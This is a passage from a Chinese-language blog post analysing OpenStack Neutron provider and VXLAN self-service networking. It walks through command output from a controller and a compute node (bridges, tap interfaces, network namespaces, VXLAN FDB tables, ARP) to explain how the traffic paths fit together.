pfifo_fast master brqdd604587-35 state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fe:16:3e:4d:6a:b1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">[root@compute1 ~]# brctl show</span><br><span class="line">bridge name     bridge <span class="built_in">id</span>               STP enabled     interfaces</span><br><span class="line">brqdd604587-35          8000.000c29a8d7e0       no              ens33</span><br><span class="line">                                                        tap76c0c08c-79</span><br><span class="line">[root@compute1 ~]# ip a</span><br><span class="line">......</span><br><span class="line">6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.31/24 brd 10.0.0.255 scope global brqdd604587-35</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: tap76c0c08c-79: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fe:16:3e:4d:6a:b1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::fc16:3eff:fe4d:6ab1/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>改变主要是在计算节点，在计算节点中他的网桥关联了一个新的接口<code>tap76c0c08c-79</code>,这个接口是怎么来的呢，可以参考虚机的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# virsh list</span><br><span class="line"> Id    Name                           State</span><br><span class="line">----------------------------------------------------</span><br><span class="line"> 3     instance-00000010              running</span><br><span class="line">[root@compute1 ~]# <span class="built_in">cd</span> /etc/libvirt/qemu/</span><br><span class="line">[root@compute1 qemu]# <span class="built_in">ls</span></span><br><span class="line">instance-00000010.xml  networks</span><br></pre></td></tr></table></figure><p>在<code>instance-00000010.xml</code>中，网络接口相关配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interface</span> <span class="attr">type</span>=<span class="string">&#x27;bridge&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mac</span> <span class="attr">address</span>=<span class="string">&#x27;fa:16:3e:4d:6a:b1&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">mac</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">bridge</span>=<span class="string">&#x27;brqdd604587-35&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">dev</span>=<span class="string">&#x27;tap76c0c08c-79&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">model</span> <span class="attr">type</span>=<span class="string">&#x27;virtio&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">model</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mtu</span> <span class="attr">size</span>=<span class="string">&#x27;1500&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">mtu</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">address</span> <span class="attr">type</span>=<span class="string">&#x27;pci&#x27;</span> <span class="attr">domain</span>=<span class="string">&#x27;0x0000&#x27;</span> <span class="attr">bus</span>=<span class="string">&#x27;0x00&#x27;</span> <span class="attr">slot</span>=<span class="string">&#x27;0x03&#x27;</span> <span class="attr">function</span>=<span class="string">&#x27;0x0&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br></pre></td></tr></table></figure><p>它基于<code>brqdd604587-35</code>做了一个桥接的虚拟接口到<code>tap76c0c08c-79</code>提供给虚机用。现在的网络架构如下<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250215165908.png"><br>从<a href="https://blog.boychai.xyz/index.php/archives/93/">组件理解</a>中可以知道，当前的这个供应商网络<code>provider</code>在实际通信中只是做了一层网络映射，映射到实际网络中，我们这里其实可以理解为虚机是直连在这个外部交换机上的，出现问题可以参考一下思考总结里的实验。</p><h1 id="自助式-Vxlan网络"><a href="#自助式-Vxlan网络" class="headerlink" title="自助式-Vxlan网络"></a>自助式-Vxlan网络</h1><p><code>Self-service networks</code>的VXLAN网络，网络拓扑拓扑如下<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217154812.png"><br>网络相关配置如下<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217160721.png"><br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217160703.png"><br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217160622.png"><br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217160541.png"><br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217160531.png"><br>开启主机去看网络信息，在控制节点的网络信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip <span class="built_in">link</span></span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:b2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">7: tap7cb3b509-23@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 9a:4f:c8:45:64:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">8: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN mode DEFAULT</span><br><span class="line">group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">9: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">10: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen</span><br><span class="line">1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">14: tapf00694f6-24@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 5a:b6:d1:fe:08:64 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">15: tap31b0feaa-20@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 3e:f5:9d:44:57:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">[root@controller ~]# ip a</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope <span class="built_in">link</span> noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:b2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.0.11/24 brd 172.16.0.255 scope global noprefixroute ens37</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fe08:b5b2/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: tap7cb3b509-23@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 9a:4f:c8:45:64:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">8: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">9: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::44b9:8bff:feee:1639/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.11/24 brd 10.0.0.255 scope global brqdd604587-35</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::2073:d5ff:fedc:5d7/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">14: tapf00694f6-24@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP group</span><br><span class="line">default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 5a:b6:d1:fe:08:64 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">15: tap31b0feaa-20@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP group</span><br><span class="line">default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 3e:f5:9d:44:57:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">[root@controller ~]# ip netns</span><br><span class="line">qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 (<span class="built_in">id</span>: 0)</span><br><span class="line">qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02 (<span class="built_in">id</span>: 1)</span><br><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 ip a</span><br><span class="line">2: qg-f00694f6-24@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:6a:e4:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.0.0.208/24 brd 10.0.0.255 scope global qg-f00694f6-24</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe6a:e480/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: qr-31b0feaa-20@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:3d:18:d0 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.10.10.1/24 brd 10.10.10.255 scope global qr-31b0feaa-20</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe3d:18d0/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02 ip a</span><br><span class="line">2: ns-7cb3b509-23@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:85:9c:4c brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.10.10.100/24 brd 10.10.10.255 scope global ns-7cb3b509-23</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 169.254.169.254/16 brd 169.254.255.255 scope global ns-7cb3b509-23</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe85:9c4c/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@controller ~]# brctl show</span><br><span class="line">bridge name     bridge <span class="built_in">id</span>               STP enabled     interfaces</span><br><span class="line">brq7f850748-2d          8000.0ab61f77c41b       no              tap31b0feaa-20</span><br><span class="line">                                                        tap7cb3b509-23</span><br><span class="line">                                                        vxlan-1</span><br><span class="line">brqdd604587-35          8000.000c2908b59e       no              ens33</span><br><span class="line">                                                        tapf00694f6-24</span><br></pre></td></tr></table></figure><p>由于内容较多，这里就先把控制节点的结构分析一下先看网桥，他有两个网桥，它与子网的ID是对的上号的，具体可以看看上面的截图，vxlan子网id为<code>7f850748-2d01-4f88-95fa-41b6144b1c02</code>这里的网桥名字就是<code>brq7f850748-2d</code>brq+子网id的前10位，然后我们先看一下<code>brqdd604587-35</code>，这个网络是外部<code>provider</code>网络，他是ens33的网桥，他有一个接口<code>tapf00694f6-24</code>，我们再看一下这个接口，发现在<code>qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3</code>命名空间中一个连接的接口<code>qg-f00694f6-24@if14</code>他的ip是<code>10.0.0.208</code>这里估计是一个出网的IP，他是在<code>provider</code>子网端口中也有记录，具体可以去集群中查看，然后再看一下<code>vxlan-1</code>的网桥<code>brq7f850748-2d</code>，上面除了<code>vxlan-1</code>的接口，还有两个虚拟接口分别是<code>tap31b0feaa-20</code>和<code>tap7cb3b509-23</code>，它们的对端可以在命名空间中找到，<code>tap31b0feaa-20</code>对端在<code>qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3</code>命名空间中，对应的接口名字是<code>qr-31b0feaa-20</code>，他的ip是<code>10.10.10.1</code>，这个ip可以得知是在当前子网的网关，在集群中可以得知的ip，这个命名空间中还有一个接口，它的对端刚好是<code>provider</code>网络的网桥中的接口，我们继续看<code>vxlan-1</code>网络的的个虚拟接口<code>tap7cb3b509-23</code>,他的对端是<code>qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02</code>命名空间中的<code>ns-7cb3b509-23</code>接口用作DHCP。<br>计算节点的网络信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# ip <span class="built_in">link</span></span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:f4 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">7: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">8: tap26500e0a-b5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast master brq7f850748-2d state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fe:16:3e:68:60:74 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">10: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">[root@compute1 ~]# ip a</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope <span class="built_in">link</span> tentative noprefixroute dadfailed</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5597:3a9:a4bd:ae3a/64 scope <span class="built_in">link</span> tentative noprefixroute dadfailed</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::6f88:d473:e534:aaf9/64 scope <span class="built_in">link</span> tentative noprefixroute dadfailed</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:f4 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.0.31/24 brd 172.16.0.255 scope global noprefixroute ens37</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fea8:d7f4/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.31/24 brd 10.0.0.255 scope global brqdd604587-35</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">8: tap26500e0a-b5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast master brq7f850748-2d state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fe:16:3e:68:60:74 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::fc16:3eff:fe68:6074/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">[root@compute1 ~]# brctl show</span><br><span class="line">bridge name     bridge <span class="built_in">id</span>               STP enabled     interfaces</span><br><span class="line">brq7f850748-2d          8000.6ee5c44f34c9       no              tap26500e0a-b5</span><br><span class="line">                                                        vxlan-1</span><br><span class="line">brqdd604587-35          8000.000c29a8d7e0       no              ens33</span><br></pre></td></tr></table></figure><p>先看一下网桥，<code>brqdd604587-35</code>是<code>provider</code>网络的一个网桥，这里不多讲，在这个节点并没有使用到他，看一下另外一个网桥<code>brq7f850748-2d</code>，它是<code>vxlan-1</code>设备的网桥，另一个接口<code>tap26500e0a-b5</code>连接在实例中。<br>分析完上面的网络，这里再讲一下<code>vxlan-1</code>这个设备，他是<code>Neutron</code>负责管理的，就以现在的网络拓扑为例，他如果要出外网就需要去找<code>10.10.10.1</code>这个网关，他在控制节点上，他是如何找到它的？而且当前的网络信息，没有设备连接到ens37上，参考上面的引用，再搭建的过程中，这个网络是用来做vxlan的接口，他为啥是一个单独的接口没有任何的关联？这里就要说到vxlan了它们的通信是采用vxlan的方式，当前的拓扑<code>vxlan-1</code>是集群子网<code>brq7f850748-2d</code>网桥的最外层，网桥是桥接的它，在配置他的过程中还有一段配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[vxlan]</span><br><span class="line">enable_vxlan = true</span><br><span class="line">local_ip = 172.16.0.31</span><br><span class="line">l2_population = true</span><br></pre></td></tr></table></figure><p>这是在计算节点的配置，这个<code>local_ip</code>是用来封装vxlan的，它定义了vxlan具体使用的网卡，这个ip必须是当前主机的一个ip，而且必须要和对端vxlan设备相通，具体的跨节点数据包发过来之后，他会在数据包的基础上，封装一层，原地址就写这个<code>local_ip</code>，对端的ip则会写<code>FDB</code>表对应的IP，<br>这个对应表是通过<code>L2 Population</code>去发现，也有其他实现的方法(组播形式)，配置体现也在上面(vxlan配置)，通过命令<code>bridge fdb show dev vxlan-1</code>可以拿到学习到的<code>FDB</code>表，控制节点的内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# bridge fdb show dev vxlan-1</span><br><span class="line">0a:b6:1f:77:c4:1b vlan 1 master brq7f850748-2d permanent</span><br><span class="line">0a:b6:1f:77:c4:1b master brq7f850748-2d permanent</span><br><span class="line">00:00:00:00:00:00 dst 172.16.0.31 self permanent</span><br><span class="line">fa:16:3e:68:60:74 dst 172.16.0.31 self permanent</span><br></pre></td></tr></table></figure><p>计算节点的内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# bridge fdb show dev vxlan-1</span><br><span class="line">6e:e5:c4:4f:34:c9 vlan 1 master brq7f850748-2d permanent</span><br><span class="line">6e:e5:c4:4f:34:c9 master brq7f850748-2d permanent</span><br><span class="line">00:00:00:00:00:00 dst 172.16.0.11 self permanent</span><br><span class="line">fa:16:3e:85:9c:4c dst 172.16.0.11 self permanent</span><br><span class="line">fa:16:3e:3d:18:d0 dst 172.16.0.11 self permanent</span><br></pre></td></tr></table></figure><p>这里的<code>FDB</code>表内容是，对方mac地址+vxlan设备地址，这些mac具体对应的ip可以在对应的对端网络通过查看arp表获取，例如在控制节点的对应网络中，即<code>qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02</code>命名空间中的arp表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 ip a</span><br><span class="line">......</span><br><span class="line">3: qr-31b0feaa-20@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:3d:18:d0 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.10.10.1/24 brd 10.10.10.255 scope global qr-31b0feaa-20</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe3d:18d0/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 arp</span><br><span class="line">Address                  HWtype  HWaddress           Flags Mask            Iface</span><br><span class="line">10.10.10.133             ether   fa:16:3e:68:60:74   C                     qr-31b0feaa-20</span><br><span class="line">gateway                  ether   00:50:56:ea:8e:2f   C                     qg-f00694f6-24</span><br></pre></td></tr></table></figure><p>在实例中的对应表如下<br><img 